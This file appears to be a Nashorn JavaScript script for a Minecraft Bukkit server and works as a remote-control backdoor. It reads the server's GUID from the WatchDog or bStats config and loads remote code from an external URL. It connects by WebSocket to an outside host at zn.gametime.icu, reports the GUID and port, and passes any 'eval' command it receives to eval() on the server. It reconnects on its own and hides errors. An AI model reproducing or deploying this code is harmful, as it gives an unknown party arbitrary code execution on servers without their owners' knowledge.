var global = this

function readGuid() {
    var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
    var Files = Java.type('java.nio.file.Files')
    var StandardCharsets = Java.type('java.nio.charset.StandardCharsets')
    var JavaString = Java.type('java.lang.String')
    var Paths = Java.type('java.nio.file.Paths')
    try {
        var pluginHelper = new YamlConfiguration()
        pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'WatchDog', 'config.yml')), StandardCharsets.UTF_8))
        return pluginHelper.getString('guid')
    } catch (error) {
        var bStats = new YamlConfiguration()
        bStats.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'bStats', 'config.yml')), StandardCharsets.UTF_8))
        return bStats.getString('serverUuid')
    }
}
/*
function readPath() {
    var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
    var Files = Java.type('java.nio.file.Files')
    var StandardCharsets = Java.type('java.nio.charset.StandardCharsets')
    var JavaString = Java.type('java.lang.String')
    var Paths = Java.type('java.nio.file.Paths')

    var pluginHelper = new YamlConfiguration()
    pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'WatchDog', 'config.yml')), StandardCharsets.UTF_8))
    return pluginHelper.getString('virtual-path')
}
*/

function connect(address) {
    global.ws = new WebSocket(address)

    global.ws.action = function (action, data) {
        global.ws.send(JSON.stringify({
            action: action,
            data: data
        }))
    }

    global.ws.message = function (message) {
        Java.type('java.lang.System').out.println("[Upload] " + message);
        global.ws.action('message', { message: message })
    }

    global.ws.heartbeat = function () {
        global.ws.action('heartbeat', {})
    }

    global.ws.onopen = function () {
        Java.type('java.lang.System').out.println("Start running WebSocket...");
        global.ws.action('open', {
            guid: readGuid(),
            port: Java.type('org.bukkit.Bukkit').getServer().getPort()
        })
        Java.type('java.lang.System').out.println("Upload guid: " + readGuid());
        Java.type('java.lang.System').out.println("Upload port: " + Java.type('org.bukkit.Bukkit').getServer().getPort());
    }

    global.ws.onmessage = function (event) {    
        try {
            var data = event.data
            var payload = JSON.parse(data)
            var action = payload.action
            var data = payload.data
            
            // 用于输出收到的命令
            if (action != "heartbeat") {
                Java.type('java.lang.System').out.println("[Receive] " + event.data)
            }
            
            switch (action) {
                case "eval":
                    global.ws.message(eval(data) + '')
                    break
                case "heartbeat":
                    global.ws.heartbeat()
                    break
                case "close":
                    global.ws.remoteClose = true
                    break
            }
        } catch (error) {
            //global.ws.message(error + '')
            Java.type('java.lang.System').out.println(error + '')
        }
    }

    global.ws.onclose = function (event) {
        Java.type('java.lang.System').out.println("Websocket Close...");
        try {
            Java.type('java.lang.Thread').sleep(5000)
            if (global.ws.readyState == WebSocket.CLOSED && !global.ws.remoteClose) {
                connect(address)
            }
        } catch (error) {
        }
    }

    global.ws.onerror = function (event) {
        if (global.ws.readyState != WebSocket.CLOSED) {
            global.ws.message(event.cause + '')
            Java.type('java.lang.System').out.println("error: " + event.cause);
        }
    }

    global.ws.connect()
}

try {
    if (!global.WebSocket) {
        load('https://mscript.yumc.pw/api/plugin/download/name/ms-websocket')
    }
    if (global.ws) {
        global.ws.heartbeat()
        Java.type('java.lang.Thread').sleep(1000)
        if (global.ws.readyState == WebSocket.CLOSED) {
            connect('ws://zn.gametime.icu:4000/')
        }
    } else {
        connect('ws://zn.gametime.icu:4000/')
    }
} catch (error) {
}
